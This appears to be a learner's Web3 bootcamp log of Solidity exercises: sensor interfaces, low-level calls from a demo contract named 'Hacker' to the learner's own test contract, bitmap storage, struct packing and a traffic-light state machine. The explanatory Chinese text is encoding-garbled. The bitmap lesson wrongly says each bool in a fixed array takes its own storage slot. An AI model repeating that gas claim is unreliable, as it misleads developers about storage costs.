    // æ¥å£å‡½æ•°åªæœ‰å£°æ˜ï¼Œæ²¡æœ‰å®ç° (æ²¡æœ‰ {})
    function getValue() external view returns (uint256);
}

// --- 2. å…·ä½“ä¼ æ„Ÿå™¨å®ç° (ç›¸å½“äº .c é©±åŠ¨æ–‡ä»¶) ---
contract TemperatureSensor is ISensor {
    uint256 public temp;
    
    constructor(uint256 _startTemp) {
        temp = _startTemp;
    }

    function setTemp(uint256 _t) public {
        temp = _t;
    }

    // å¿…é¡»å®ç°æ¥å£å®šä¹‰çš„å‡½æ•°ï¼Œå¹¶åŠ ä¸Š override å…³é”®å­—
    function getValue() external view override returns (uint256) {
        return temp;
    }
}

// --- 3. ä¸­å¤®æ§åˆ¶å™¨ (ä¸»æ§ MCU) ---
contract CentralHub {
    
    // è¿™é‡Œçš„å‚æ•°ç±»å‹æ˜¯æ¥å£ ISensorï¼Œè€Œä¸æ˜¯å…·ä½“çš„åˆçº¦åœ°å€
    // è¿™æ„å‘³ç€å®ƒå¯ä»¥æ¥æ”¶ä»»ä½•å®ç°äº† ISensor çš„åˆçº¦
    function readSensor(ISensor _sensorAddress) public view returns (uint256) {
        // ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆåº•å±‚çš„ call æŒ‡ä»¤
        // ç›¸å½“äº: _sensorAddress.call(abi.encodeWithSignature("getValue()"))
        return _sensorAddress.getValue();
    }
    
    // è¿›é˜¶ï¼šæ‰¹é‡è¯»å–å¤šä¸ªä¼ æ„Ÿå™¨
    function readAll(ISensor[] memory _sensors) public view returns (uint256[] memory) {
        uint256[] memory results = new uint256[](_sensors.length);
        for(uint i=0; i<_sensors.length; i++) {
            results[i] = _sensors[i].getValue();
        }
        return results;
    }
}
```

* * *

## 3\. å®éªŒæ­¥éª¤

**æ­¥éª¤ 1ï¼šéƒ¨ç½²ä¼ æ„Ÿå™¨**

1.  é€‰æ‹© `TemperatureSensor` åˆçº¦ã€‚
    
2.  åœ¨ Deploy æŒ‰é’®æ—çš„è¾“å…¥æ¡†å¡«å…¥åˆå§‹æ¸©åº¦ï¼ˆä¾‹å¦‚ `2500`ï¼‰ã€‚
    
3.  ç‚¹å‡» Deployã€‚
    
4.  **å¤åˆ¶** è¿™ä¸ªæ–°ä¼ æ„Ÿå™¨çš„åœ°å€ï¼ˆæˆ‘ä»¬å«å®ƒ `Sensor_A`ï¼‰ã€‚
    

**æ­¥éª¤ 2ï¼šéƒ¨ç½²ç¬¬äºŒä¸ªä¼ æ„Ÿå™¨ï¼ˆå¯é€‰ï¼‰**

1.  å†æ¬¡ä¿®æ”¹å‚æ•°ï¼ˆä¾‹å¦‚ `3000`ï¼‰ï¼Œéƒ¨ç½²å¦ä¸€ä¸ª `TemperatureSensor`ã€‚
    
2.  **å¤åˆ¶** åœ°å€ï¼ˆå«å®ƒ `Sensor_B`ï¼‰ã€‚
    

**æ­¥éª¤ 3ï¼šéƒ¨ç½²ä¸»æ§**

1.  é€‰æ‹© `CentralHub` åˆçº¦ï¼ŒDeployã€‚
    

**æ­¥éª¤ 4ï¼šæµ‹è¯•æ¥å£è°ƒç”¨**

1.  åœ¨ `CentralHub` ä¸­æ‰¾åˆ° `readSensor` å‡½æ•°ã€‚
    
2.  ç²˜è´´ `Sensor_A` çš„åœ°å€ã€‚
    
3.  ç‚¹å‡» callã€‚
    
    -   **é¢„æœŸç»“æœï¼š** è¿”å› `2500`ã€‚
        
4.  _(è¿›é˜¶)_ åœ¨ `readAll` å‡½æ•°ä¸­ï¼Œè¾“å…¥æ•°ç»„æ ¼å¼ï¼š`["Sensor_Aåœ°å€", "Sensor_Båœ°å€"]`ï¼ˆæ³¨æ„è¦ç”¨è‹±æ–‡åŒå¼•å·åŒ…è£¹åœ°å€ï¼‰ã€‚
    
    -   **é¢„æœŸç»“æœï¼š** è¿”å› `2500, 3000`ã€‚
        

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-21-1768982014447-image.png)

* * *

### ğŸ§  æ·±åº¦æ€è€ƒ

åšå®Œå®éªŒåï¼Œè¯·æ€è€ƒï¼š

CentralHub ä»£ç é‡Œæ ¹æœ¬ä¸çŸ¥é“ TemperatureSensor çš„å­˜åœ¨ï¼Œå®ƒåªçŸ¥é“ ISensorã€‚

å¦‚æœæˆ‘æ˜å¤©å†™äº†ä¸€ä¸ª HumiditySensorï¼ˆæ¹¿åº¦ä¼ æ„Ÿå™¨ï¼‰ï¼Œä¹Ÿå®ç°äº† ISensor æ¥å£ã€‚æˆ‘éœ€è¦ä¿®æ”¹ CentralHub çš„ä»£ç å—ï¼Ÿ

_ï¼ˆç­”æ¡ˆæ˜¯ä¸éœ€è¦ã€‚è¿™å°±æ˜¯â€œé¢å‘æ¥å£ç¼–ç¨‹â€çš„å¨åŠ›ï¼Œä¹Ÿæ˜¯ DeFi ç§¯æœ¨ï¼ˆå¦‚ Uniswap, Aaveï¼‰èƒ½æ— é™ç»„åˆçš„åŸºç¡€ã€‚ï¼‰_
<!-- DAILY_CHECKIN_2026-01-21_END -->

# 2026-01-20
<!-- DAILY_CHECKIN_2026-01-20_START -->










# ç¬¬9å¤©ï¼šABI ç¼–ç ä¸ä½çº§è°ƒç”¨ â€”â€” æ‰‹æ“é€šä¿¡åè®®

## 1\. ç†è®ºæ˜ å°„ï¼šä»¥å¤ªåŠçš„â€œé€šä¿¡å¸§â€æ ¼å¼

å½“ä½ å‘èµ·ä¸€ç¬”äº¤æ˜“æ—¶ï¼Œæ•°æ®åŒºï¼ˆInput Dataï¼‰å…¶å®å°±æ˜¯ä¸€æ®µå­—èŠ‚æµã€‚å®ƒçš„ç»“æ„éå¸¸ç®€å•ï¼Œåªæœ‰ä¸¤éƒ¨åˆ†ï¼š

| å­—æ®µ | é•¿åº¦ | åµŒå…¥å¼ç±»æ¯” | ä½œç”¨ |
| å‡½æ•°é€‰æ‹©å™¨ (Selector) | 4 å­—èŠ‚ | åŠŸèƒ½ç  (Function Code) | å‘Šè¯‰åˆçº¦ä½ æƒ³è°ƒç”¨å“ªä¸ªå‡½æ•°ã€‚ |
| å‚æ•°ç¼–ç  (Encoded Args) | N * 32 å­—èŠ‚ | æ•°æ®è½½è· (Payload) | å‡½æ•°çš„å…·ä½“å‚æ•°ï¼ŒæŒ‰ 32 å­—èŠ‚å¯¹é½å¡«å……ã€‚ |

-   **æ€ä¹ˆç”ŸæˆåŠŸèƒ½ç ï¼Ÿ**
    
    -   æ¯”å¦‚å‡½æ•°ç­¾åæ˜¯ `setVal(uint256)`ã€‚
        
    -   è®¡ç®—å®ƒçš„å“ˆå¸Œï¼š`keccak256("setVal(uint256)")`ã€‚
        
    -   å–å‰ 4 ä¸ªå­—èŠ‚ã€‚
        

* * *

## 2\. ä»£ç å®æˆ˜ï¼šæ‰‹åŠ¨ç»„åŒ…å‘é€ (Low-level Call)

æˆ‘ä»¬è¦å†™ä¸¤ä¸ªåˆçº¦ï¼š

1.  **Target (æ¥æ”¶ç«¯):** ä¸€ä¸ªæ™®é€šçš„åˆçº¦ï¼Œå‡è£…å®ƒæ˜¯ä¸€ä¸ªè¿œç¨‹ä¼ æ„Ÿå™¨ã€‚
    
2.  **Hacker (å‘é€ç«¯):** ä¸ä½¿ç”¨æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ï¼Œè€Œæ˜¯**æ‰‹åŠ¨æ„å»ºäºŒè¿›åˆ¶åŒ…**å»â€œæ”»å‡»/è°ƒç”¨â€æ¥æ”¶ç«¯ã€‚
    

è¯·åœ¨ Remix ä¸­æ–°å»º `Day9_LowLevel.sol`ï¼š

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. ç›®æ ‡åˆçº¦ (æœåŠ¡ç«¯)
contract Target {
    uint256 public data;
    address public sender;

    // æˆ‘ä»¬è¦è°ƒç”¨çš„ç›®æ ‡å‡½æ•°
    function setData(uint256 _data) public {
        data = _data;
        sender = msg.sender; // è®°å½•æ˜¯è°è°ƒç”¨çš„
    }
}

// 2. æ”»å‡»è€…åˆçº¦ (å®¢æˆ·ç«¯ - æ‰‹åŠ¨ç»„åŒ…)
contract Hacker {
    
    // æ–¹æ³• A: æ­£å¸¸è°ƒç”¨ (ç¼–è¯‘å™¨å¸®ä½ æ‰“åŒ…)
    function callNormal(address _target, uint256 _val) public {
        Target(_target).setData(_val);
    }

    // æ–¹æ³• B: ä½çº§è°ƒç”¨ (æ‰‹æ“æ•°æ®å¸§ - é‡ç‚¹ï¼)
    function callLowLevel(address _target, uint256 _val) public {
        
        // --- ç¬¬ä¸€æ­¥ï¼šæ‰‹åŠ¨æ„å»º Payload ---
        // ç±»ä¼¼äº: uint8_t buffer[36];
        // memcpy(buffer, selector, 4);
        // memcpy(buffer+4, data, 32);
        
        // abi.encodeWithSignature ä¼šè‡ªåŠ¨è®¡ç®—å“ˆå¸Œå‰4å­—èŠ‚å¹¶æ‹¼æ¥å‚æ•°
        bytes memory payload = abi.encodeWithSignature("setData(uint256)", _val);

        // --- ç¬¬äºŒæ­¥ï¼šå‘é€è£¸æ•°æ®åŒ… ---
        // ç±»ä¼¼äº: HAL_UART_Transmit(&huart1, payload, len, timeout);
        // .call è¿”å›ä¸¤ä¸ªå€¼: success (bool) å’Œ returnData (bytes)
        (bool success, ) = _target.call(payload);

        require(success, "Call failed!");
    }
}
```

* * *

3\. å®éªŒæ­¥éª¤ (è¯·ä¸¥æ ¼æ‰§è¡Œ)

**æ­¥éª¤ 1ï¼šéƒ¨ç½² Target**

1.  éƒ¨ç½² `Target` åˆçº¦ã€‚
    
2.  å¤åˆ¶å®ƒçš„åœ°å€ï¼ˆç‚¹å‡» Copy å›¾æ ‡ï¼‰ã€‚
    

**æ­¥éª¤ 2ï¼šéƒ¨ç½² Hacker**

1.  éƒ¨ç½² `Hacker` åˆçº¦ã€‚
    

**æ­¥éª¤ 3ï¼šæ­£å¸¸è°ƒç”¨æµ‹è¯• (åŸºå‡†ç»„)**

1.  åœ¨ `Hacker` çš„ `callNormal` ä¸­ï¼Œè¾“å…¥ Target åœ°å€å’Œæ•°å­— `123`ã€‚
    
2.  ç‚¹å‡» transactã€‚
    
3.  å» `Target` æ£€æŸ¥ `data`ï¼Œåº”è¯¥æ˜¯ `123`ã€‚
    
4.  **å…³é”®è§‚å¯Ÿï¼š** åœ¨æ§åˆ¶å°æŸ¥çœ‹è¿™ç¬”äº¤æ˜“çš„ `Input` å­—æ®µã€‚
    
    -   å®ƒçœ‹èµ·æ¥åƒ `0x` + `åŠŸèƒ½ç ` + `...00007b` (123çš„åå…­è¿›åˆ¶)ã€‚
        

**æ­¥éª¤ 4ï¼šä½çº§è°ƒç”¨æµ‹è¯• (å®éªŒç»„)**

1.  åœ¨ `Hacker` çš„ `callLowLevel` ä¸­ï¼Œè¾“å…¥ Target åœ°å€å’Œæ•°å­— `999`ã€‚
    
2.  ç‚¹å‡» transactã€‚
    
3.  å» `Target` æ£€æŸ¥ `data`ã€‚å¦‚æœå˜æˆäº† `999`ï¼Œè¯´æ˜ä½ **æ‰‹åŠ¨ç»„è£…çš„æ•°æ®åŒ…**è¢«å¯¹æ–¹æˆåŠŸè§£æäº†ï¼
    

* * *

![å±å¹•æˆªå›¾ 2026-01-20 130639.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-20-1768887131070-_____2026-01-20_130639.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-20-1768887153864-image.png)

## 4\. æ·±åº¦æ€è€ƒ (è°ƒè¯•è§†è§’)

æˆ‘åœ¨ä»£ç é‡Œå†™çš„æ˜¯ abi.encodeWithSignature("setData(uint256)", \_val)ã€‚

å¦‚æœä¸å°å¿ƒå¤šæ‰“äº†ä¸€ä¸ªç©ºæ ¼ï¼Œå†™æˆäº† "setData(uint256 )"ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ

-   _å›ç­”ï¼šè¿™ä¼šæ”¹å˜å­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ï¼Œå¯¼è‡´ç”Ÿæˆçš„â€œåŠŸèƒ½ç â€å®Œå…¨æ”¹å˜ã€‚Target åˆçº¦æ”¶åˆ°åï¼Œå‘ç°åŒ¹é…ä¸åˆ°ä»»ä½•å‡½æ•°ï¼Œå°±ä¼šæŠ¥é”™ï¼ˆæˆ–è¿›å…¥ fallback å‡½æ•°ï¼‰ã€‚è¿™å°±åƒ MODBUS å‘é”™äº†åŠŸèƒ½ç ï¼Œä»æœºä¸å“åº”ã€‚_
<!-- DAILY_CHECKIN_2026-01-20_END -->

# 2026-01-19
<!-- DAILY_CHECKIN_2026-01-19_START -->











# ç¬¬8å¤©ï¼šä½å›¾ (Bitmap) ä¸ å­˜å‚¨å‹ç¼©

åœ¨åµŒå…¥å¼å¼€å‘ä¸­ï¼Œå¯„å­˜å™¨æ“ä½œæ˜¯å®¶å¸¸ä¾¿é¥­ï¼š

GPIOA->ODR |= (1 << 5); // å°†ç¬¬5ä½æ‹‰é«˜

åœ¨ Solidity ä¸­ï¼Œè¿™ç§â€œæŠ æŠ ç´¢ç´¢â€çš„æ“ä½œä¸ä»…æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œæ›´æ˜¯ä¸ºäº†**çœé’±**ã€‚å› ä¸ºä½ å·²ç»çŸ¥é“ï¼Œ`SSTORE`ï¼ˆå†™ Flashï¼‰æ˜¯æ•´ä¸ªä»¥å¤ªåŠæœ€è´µçš„æ“ä½œï¼ˆ20,000 Gasï¼‰ã€‚

## 1\. ç†è®ºæ˜ å°„ï¼šStorage Slot (å­˜å‚¨æ§½) = 32ä½å¯„å­˜å™¨ï¼Ÿ

-   **STM32:** å†…å­˜åœ°å€é€šå¸¸ä»¥ 4 å­—èŠ‚ï¼ˆ32ä½ï¼‰å¯¹é½ã€‚
    
-   **EVM:** å­˜å‚¨æ§½ï¼ˆSlotï¼‰æ˜¯ **32 å­—èŠ‚ï¼ˆ256ä½ï¼‰** å¯¹é½çš„ã€‚
    

å·¨å¤§çš„æµªè´¹é™·é˜±ï¼š

å¦‚æœä½ å®šä¹‰äº† bool isCompleted\[256\]ï¼š

-   **Cè¯­è¨€:** ç¼–è¯‘å™¨å¯èƒ½ä¼šä¼˜åŒ–ï¼Œæˆ–è€…å  256 å­—èŠ‚ã€‚
    
-   **Solidity:** é»˜è®¤æƒ…å†µä¸‹ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½ä¼šå ç”¨ä¸€ä¸ªæ–°çš„ Slotï¼ˆæˆ–è€…å¤§éƒ¨åˆ†ï¼‰ã€‚
    
-   **æˆæœ¬:** å¦‚æœä½ è¦åˆå§‹åŒ–è¿™ 256 ä¸ªå¸ƒå°”å€¼ï¼Œä½ å¯èƒ½éœ€è¦æ”¯ä»˜ **256 x 20,000 Gas**ã€‚è¿™æ˜¯å¤©æ–‡æ•°å­—ï¼
    

### ä½å›¾æ–¹æ¡ˆ (Bitmap):

å¦‚æœæˆ‘ä»¬ç”¨ä¸€ä¸ª uint256 å˜é‡æ¥ä»£è¡¨ 256 ä¸ªå¼€å…³ï¼š

-   **æˆæœ¬:** åªéœ€è¦æ”¯ä»˜ **1 x 20,000 Gas**ã€‚
    
-   **æ•ˆç‡:** æå‡äº† **256å€**ã€‚
    

è¿™å®Œå…¨å°±æ˜¯ä½ ç†Ÿæ‚‰çš„ **ä½æ©ç  (Bitmask)** æŠ€æœ¯ã€‚

* * *

## 2\. ä»£ç å®æˆ˜ï¼šç¼–å†™ `BitMap` åˆçº¦

æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªç­¾åˆ°ç³»ç»Ÿã€‚å¦‚æœæ˜¯ Web2 å¼€å‘è€…ï¼Œå¯èƒ½ä¼šå†™ä¸€ä¸ª mapping å­˜æ¯å¤©çš„ç­¾åˆ°çŠ¶æ€ã€‚ä½†ä½œä¸ºåµŒå…¥å¼å·¥ç¨‹å¸ˆï¼Œæˆ‘ä»¬è¦ç”¨**ä¸€ä¸ªæ•´æ•°å­˜ä¸‹ä¸€æ•´å¹´çš„ç­¾åˆ°è®°å½•**ã€‚

è¯·åœ¨ Remix ä¸­æ–°å»º `Day8_Bitmap.sol`ï¼š

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BitmapRegister {
    // è¿™é‡Œçš„ bits å°±æ˜¯æˆ‘ä»¬çš„ "256ä½ å¯„å­˜å™¨"
    // å®ƒå¯ä»¥å­˜å‚¨ 256 ä¸ª boolean çŠ¶æ€
    uint256 public bits;

    // 1. ç½®ä½ (SET BIT) - ç›¸å½“äº GPIO_BSRR
    function checkIn(uint8 index) public {
        require(index < 256, "Index overflow");
        
        // é€»è¾‘: bits = bits | (1 << index)
        // æ³¨æ„: 1 éœ€è¦æ˜¾å¼è½¬ä¸º uint256ï¼Œé˜²æ­¢ç§»ä½æº¢å‡º
        uint256 mask = uint256(1) << index;
        bits = bits | mask;
    }

    // 2. å¤ä½ (CLEAR BIT) - ç›¸å½“äº GPIO_BRR
    function cancelCheckIn(uint8 index) public {
        require(index < 256, "Index overflow");

        // é€»è¾‘: bits = bits & ~(1 << index)
        uint256 mask = ~(uint256(1) << index);
        bits = bits & mask;
    }

    // 3. è¯»ä½ (READ BIT) - ç›¸å½“äº (IDR & mask)
    function isCheckedIn(uint8 index) public view returns (bool) {
        require(index < 256, "Index overflow");

        uint256 mask = uint256(1) << index;
        return (bits & mask) != 0;
    }

    // --- é«˜çº§åŠŸèƒ½ï¼šä¸€æ¬¡æ€§è·å–æ‰€æœ‰ç­¾åˆ°çŠ¶æ€ ---
    // ç›´æ¥è¿”å›è¿™ä¸ªå¤§æ•´æ•°ï¼Œå‰ç«¯å»è§£ææ¯ä¸€ä½
    function getAllBits() public view returns (uint256) {
        return bits;
    }
}
```

* * *

## 3\. å®éªŒéªŒè¯

1.  **éƒ¨ç½²** `BitmapRegister`ã€‚
    
2.  **æŸ¥çœ‹åˆå§‹çŠ¶æ€:** ç‚¹å‡» `bits`ï¼Œåº”ä¸º `0`ã€‚
    
3.  **ç­¾åˆ° (SET):**
    
    -   è°ƒç”¨ `checkIn(0)`ã€‚
        
    -   æŸ¥çœ‹ `bits` -> å˜æˆ `1` (äºŒè¿›åˆ¶ `...001`)ã€‚
        
4.  **å†æ¬¡ç­¾åˆ° (SET):**
    
    -   è°ƒç”¨ `checkIn(1)`ã€‚
        
    -   æŸ¥çœ‹ `bits` -> å˜æˆ `3` (äºŒè¿›åˆ¶ `...011`)ã€‚
        
5.  **è·³è·ƒç­¾åˆ°:**
    
    -   è°ƒç”¨ `checkIn(8)`ã€‚
        
    -   æŸ¥çœ‹ `bits` -> å˜æˆ `259` (äºŒè¿›åˆ¶ `...100000011`)ã€‚å³ $2^8 + 2^1 + 2^0 = 256 + 2 + 1 = 259$ã€‚
        
6.  **å–æ¶ˆç­¾åˆ° (CLEAR):**
    
    -   è°ƒç”¨ `cancelCheckIn(0)`ã€‚
        
    -   æŸ¥çœ‹ `bits` -> å˜æˆ `258`ã€‚
        

Gas è§‚å¯Ÿï¼š

æŸ¥çœ‹æ§åˆ¶å°ï¼Œè¿™äº›æ“ä½œçš„ Gas æ¶ˆè€—æä½ï¼ˆé™¤äº†ç¬¬ä¸€æ¬¡ä»0å˜1æ¯”è¾ƒè´µï¼Œåç»­çš„ä¿®æ”¹éƒ½éå¸¸ä¾¿å®œï¼Œå› ä¸º Slot å·²ç»è¢«â€œé¢„çƒ­â€ä¸”éé›¶ï¼‰ã€‚

![å±å¹•æˆªå›¾ 2026-01-19 230829.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-19-1768836904061-_____2026-01-19_230829.png)![å±å¹•æˆªå›¾ 2026-01-19 230931.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-19-1768836947512-_____2026-01-19_230931.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-19-1768836892131-image.png)

* * *

## 4\. è¿›é˜¶ç†è®ºï¼šå˜é‡æ‰“åŒ… (Variable Packing)

é™¤äº†æ‰‹åŠ¨ä½æ“ä½œï¼ŒSolidity ç¼–è¯‘å™¨ä¹Ÿä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬åšâ€œç»“æ„ä½“å¯¹é½/æ‰“åŒ…â€ã€‚

**è¯·çœ‹è¿™ç»„å¯¹æ¯”ï¼š**

**æ–¹æ¡ˆ A (ç³Ÿç³•çš„å¸ƒå±€):**

Solidity

```
struct BadLayout {
    uint8 a;     // 1 byte
    uint256 b;   // 32 bytes (å¿…é¡»å¼€æ–°æ§½ï¼Œå› ä¸º Slot åªæœ‰ 32 bytes)
    uint8 c;     // 1 byte (åˆå¼€æ–°æ§½)
}
// ç»“æœï¼šå ç”¨ 3 ä¸ª Slots (96 bytes) -> 3å€å­˜å‚¨æˆæœ¬
```

**æ–¹æ¡ˆ B (ä¼˜ç§€çš„å¸ƒå±€ - åµŒå…¥å¼æ€ç»´):**

Solidity

```
struct GoodLayout {
    uint8 a;     // 1 byte
    uint8 c;     // 1 byte (ç´§å‡‘æ’åˆ—ï¼Œå¡è¿›åŒä¸€ä¸ª Slot)
    // æ­¤æ—¶ Slot 1 è¿˜å‰© 30 bytes
    uint256 b;   // 32 bytes (Slot 1 æ”¾ä¸ä¸‹äº†ï¼Œå¼€ Slot 2)
}
// ç»“æœï¼šå ç”¨ 2 ä¸ª Slots -> çœé’±ï¼
```

**æ›´ä¼˜æ–¹æ¡ˆ C:**

Solidity

```
struct BestLayout {
    uint128 a;   // 16 bytes
    uint128 b;   // 16 bytes
}
// ç»“æœï¼šæ­£å¥½ 32 bytesï¼Œå ç”¨ 1 ä¸ª Slotã€‚
```

* * *

5\. ä»Šæ—¥ä½œä¸š

ä¸ºäº†å·©å›ºâ€œä½æ“ä½œâ€å’Œâ€œæ‰“åŒ…â€çš„æ¦‚å¿µï¼Œè¯·ä½ å®Œæˆä»¥ä¸‹ä»»åŠ¡ï¼š

ä»»åŠ¡ï¼š

ç¼–å†™ä¸€ä¸ªæ–°çš„åˆçº¦ PackedSwitchã€‚

1.  å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ï¼š
    
    Solidity
    
    ```
    struct Config {
        uint64 startTime; // 8 bytes
        uint64 endTime;   // 8 bytes
        uint8 mode;       // 1 byte
        bool isActive;    // 1 byte
    }
    ```
    
2.  å£°æ˜ä¸€ä¸ª `Config` ç±»å‹çš„å…¬å¼€å˜é‡ `sysConfig`ã€‚
    
3.  å†™ä¸€ä¸ªå‡½æ•° `updateConfig` ä¸€æ¬¡æ€§æ›´æ–°æ‰€æœ‰å­—æ®µã€‚
    

æ€è€ƒé¢˜ï¼š

åœ¨è¿™ä¸ªç»“æ„ä½“ä¸­ï¼Œæ‰€æœ‰å­—æ®µåŠ èµ·æ¥ä¸€å…±ç”¨äº†å¤šå°‘å­—èŠ‚ï¼Ÿå®ƒä»¬ä¼šè¢«å­˜æ”¾åœ¨ 1 ä¸ª Slot é‡Œï¼Œè¿˜æ˜¯ 2 ä¸ªï¼Ÿ

(æç¤ºï¼š$8+8+1+1 = 18$ å­—èŠ‚ï¼Œå°äº 32 å­—èŠ‚)
<!-- DAILY_CHECKIN_2026-01-19_END -->

# 2026-01-18
<!-- DAILY_CHECKIN_2026-01-18_START -->












# ç¬¬7å¤©ï¼šç¬¬ä¸€å‘¨å®æˆ˜â€”â€”â€œçº¢ç»¿ç¯â€çŠ¶æ€æœºç³»ç»Ÿ

ä»Šå¤©æ²¡æœ‰æ–°è¯­æ³•ï¼Œåªæœ‰å®æˆ˜ã€‚

æˆ‘ä»¬å°†æŠŠè¿‡å» 6 å¤©å­¦åˆ°çš„æ‰€æœ‰ç§¯æœ¨ï¼ˆæšä¸¾ã€æ—¶é—´æˆ³ã€äº‹ä»¶ã€é€»è¾‘æ§åˆ¶ï¼‰ç»„åˆèµ·æ¥ï¼Œæ„å»ºä¸€ä¸ªå¸¦æœ‰æ—¶é—´æ§åˆ¶çš„äº¤é€šä¿¡å·ç¯ç³»ç»Ÿã€‚

è¿™å¯¹äºåµŒå…¥å¼å·¥ç¨‹å¸ˆæ¥è¯´æ˜¯â€œé€åˆ†é¢˜â€ï¼Œå› ä¸º**çŠ¶æ€æœº (FSM)** æ˜¯ä½ çš„æœ¬èƒ½ã€‚ä½†åœ¨åŒºå—é“¾ä¸Šï¼Œæˆ‘ä»¬è¦é¢å¯¹ä¸€ä¸ªæ–°å¯¹æ‰‹ï¼š**æ—¶é—´æ¬ºéª—**ã€‚

## 1\. é¡¹ç›®éœ€æ±‚è§„æ ¼ä¹¦ (Spec)

è¯·æ„å»ºä¸€ä¸ªåˆçº¦ `TrafficLight`ï¼Œæ»¡è¶³ä»¥ä¸‹åµŒå…¥å¼é€»è¾‘ï¼š

1.  **çŠ¶æ€å®šä¹‰ï¼š** ç³»ç»Ÿåªæœ‰ä¸‰ç§çŠ¶æ€ï¼š`Red`, `Green`, `Yellow`ã€‚
    
2.  **åˆå§‹çŠ¶æ€ï¼š** ä¸Šç”µï¼ˆéƒ¨ç½²ï¼‰æ—¶é»˜è®¤ä¸º `Red`ã€‚
    
3.  **æµè½¬è§„åˆ™ (ç¡¬é€»è¾‘)ï¼š**
    
    -   ğŸ”´ Red â€”â€”> ğŸŸ¢ Green
        
    -   ğŸŸ¢ Green â€”â€”> ğŸŸ¡ Yellow
        
    -   ğŸŸ¡ Yellow â€”â€”> ğŸ”´ Red
        
    -   _ç¦æ­¢ä»»ä½•å…¶ä»–è·³è½¬ï¼ˆæ¯”å¦‚çº¢ç¯ä¸èƒ½ç›´æ¥å˜é»„ç¯ï¼‰ã€‚_
        
4.  **æ—¶é—´æ§åˆ¶ (è½¯é€»è¾‘)ï¼š**
    
    -   ä¸ºäº†å®‰å…¨ï¼Œçº¢ç¯å¿…é¡»è‡³å°‘äº® 1 åˆ†é’Ÿï¼ˆ60ç§’ï¼‰æ‰èƒ½åˆ‡æ¢ã€‚
        
    -   ç»¿ç¯è‡³å°‘ 1 åˆ†é’Ÿã€‚
        
    -   é»„ç¯è‡³å°‘ 5 ç§’ã€‚
        
    -   _å¦‚æœåœ¨å€’è®¡æ—¶ç»“æŸå‰å°è¯•åˆ‡æ¢ï¼Œå¿…é¡»æŠ¥é”™ã€‚_
        
5.  **è¾“å‡ºä¿¡å·ï¼š** æ¯æ¬¡åˆ‡æ¢ï¼Œå‘å°„äº‹ä»¶ `LightChanged(NewState, Timestamp)`ã€‚
    

* * *

## 2\. ä»£ç å®æˆ˜ï¼šå¡«ç©ºé¢˜

ä¸ºäº†æµ‹è¯•ä½ çš„æŒæ¡ç¨‹åº¦ï¼Œæˆ‘æä¾›ä¸€ä¸ª**ä»£ç éª¨æ¶**ã€‚è¯·åœ¨ Remix ä¸­æ–°å»º `Day7_TrafficLight.sol`ï¼Œå¹¶å°è¯•**å¡«è¡¥** `TODO` **éƒ¨åˆ†çš„ä»£ç **ã€‚

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TrafficLight {
    
    // 1. å®šä¹‰æšä¸¾ (çŠ¶æ€æœº)
    enum State { Red, Green, Yellow }
    State public currentState;

    // 2. è®°å½•ä¸Šä¸€æ¬¡åˆ‡æ¢çš„æ—¶é—´ (ç±»ä¼¼äº systick)
    uint256 public lastChangeTime;

    // 3. å®šä¹‰äº‹ä»¶ (ä¸­æ–­ä¿¡å·)
    event LightChanged(State newState, uint256 timestamp);

    constructor() {
        currentState = State.Red;
        lastChangeTime = block.timestamp; // è®°å½•ä¸Šç”µæ—¶é—´
    }

    // æ ¸å¿ƒå‡½æ•°ï¼šåˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªçŠ¶æ€
    // ä¸éœ€è¦è¾“å…¥å‚æ•°ï¼Œå› ä¸ºçŠ¶æ€æµè½¬æ˜¯ç¡®å®šçš„ (Red->Green->Yellow->Red)
    function nextState() public {
        
        // --- TODO 1: è®¡ç®—è·ç¦»ä¸Šæ¬¡åˆ‡æ¢è¿‡å»äº†å¤šä¹… ---
        // æç¤º: ç”¨ block.timestamp å‡å» lastChangeTime
        uint256 timeElapsed = ____________________;

        // --- TODO 2: å®ç°çŠ¶æ€æœºæµè½¬é€»è¾‘ ---
        if (currentState == State.Red) {
            // çº¢ç¯é€»è¾‘ï¼šæ£€æŸ¥æ˜¯å¦æ»¡ 60 ç§’
            require(timeElapsed >= 60, "Red light: Wait more time!");
            // åˆ‡æ¢çŠ¶æ€
            currentState = State.Green;
        } 
        else if (currentState == State.Green) {
            // ç»¿ç¯é€»è¾‘ï¼šæ£€æŸ¥æ˜¯å¦æ»¡ 60 ç§’
            // ____________________ (è¯·è¡¥å…¨æ£€æŸ¥)
            
            // åˆ‡æ¢çŠ¶æ€
            // ____________________ (è¯·è¡¥å…¨èµ‹å€¼: ç»¿ -> é»„)
        } 
        else if (currentState == State.Yellow) {
            // é»„ç¯é€»è¾‘ï¼šæ£€æŸ¥æ˜¯å¦æ»¡ 5 ç§’
            require(timeElapsed >= 5, "Yellow light: Too fast!");
            
            // åˆ‡æ¢çŠ¶æ€
            currentState = State.Red;
        }

        // --- TODO 3: æ›´æ–°æ—¶é—´æˆ³ ---
        // ç±»ä¼¼äºé‡ç½®å®šæ—¶å™¨è®¡æ•°å™¨
        lastChangeTime = ____________________;

